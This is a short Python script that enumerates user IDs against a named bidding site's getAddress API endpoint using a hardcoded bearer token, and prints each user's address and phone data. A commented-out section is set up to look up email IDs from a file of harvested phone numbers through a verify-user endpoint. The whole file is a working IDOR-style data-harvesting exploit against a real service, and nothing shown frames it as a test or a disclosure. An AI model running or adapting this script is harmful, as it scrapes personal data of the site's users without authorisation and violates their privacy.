import time

import requests
import json
from requests.structures import CaseInsensitiveDict

file = open('jinglebid_phoneno.txt', 'r')
file1 = open('jinglebid_users.txt', 'r')

url = "https://jinglebid.com/"
mob_uri = "api/v2/getAddress/"
for i in range(1, 100):
    j = str(i)
    mob_url = url + mob_uri + j
    headers = CaseInsensitiveDict()
    headers["Accept"] = "application/json"
    headers[
        "Authorization"] = "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyTmFtZSI6OTY5MTYsImlhdCI6MTYzMjkyMzAyNn0.qFBKNGVx_yslq4iFUQTcs5okCoITrWkbUrluyzUcK-k"
    time.sleep(2)
    mobile_number = requests.get(mob_url, headers=headers)
    mob = mobile_number.json()
    r = (json.dumps(mob, sort_keys=True, indent=4, separators=(',', ':')))
    res = json.loads(r)
    data1 = res["data"]
    for no in data1:
        num = no
        print(num)

    # finding mail id
    # email_uri = "api/v2/verify-user"
    #for each in file:
       # x = str(each).rstrip()
        # en = "?userType=user&Phone_Number="
       # time.sleep(2)
       # email_url = "https://jinglebid.com/api/v2/verify-user?userType=user&Phone_Number=" + x

       # email_id = requests.get(email_url)
       # em = email_id.json()
       # e = (json.dumps(em, sort_keys=True, indent=4, separators=(',', ':')))
        #res = json.loads(e)
        #data1 = res["data"]
        #for email in data1:
         #   email_id = email["Email_ID"]
          #  print(email_id, "--", x)
